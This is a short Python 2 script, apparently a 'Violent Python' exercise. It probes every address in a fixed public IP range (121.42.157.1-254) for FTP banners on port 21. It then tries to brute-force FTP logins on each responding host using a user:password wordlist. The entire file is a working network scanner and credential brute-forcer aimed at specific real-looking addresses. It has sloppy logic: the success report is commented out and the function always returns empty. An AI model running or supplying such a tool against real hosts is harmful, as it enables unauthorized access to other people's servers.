__author__ = 'dscdtc'

import socket
import ftplib
def bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print '[+] Trying: %s/%s' % (userName, passWord)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            # print '\n[*] FTP Logon Succeed: %s/%s' \
                # % (userName, passWord)
        except ftplib.error_perm:
            pass
    print '\n[-] Could not brute force FTP credentials.'
    return (None, None)
        
def retBanner(ip):
    '''Connect to Web server and return banner.'''
    try:
        socket.setdefaulttimeout(1)
        s = socket.socket()
        s.connect((ip, 21))
        s.send('ViolentPython\r\n')
        banner = s.recv(1024)
        s.shutdown(2)
        s.close()
        return banner
    except:
        return 0

def main():
    passwdFile = 'userpass.txt'
    for x in range (1, 255):
        ip = '121.42.157.'+str(x)
        log = retBanner(ip)
        if log:
            print ip, log
            bruteLogin(ip, passwdFile)
    
if __name__ == '__main__':
    main()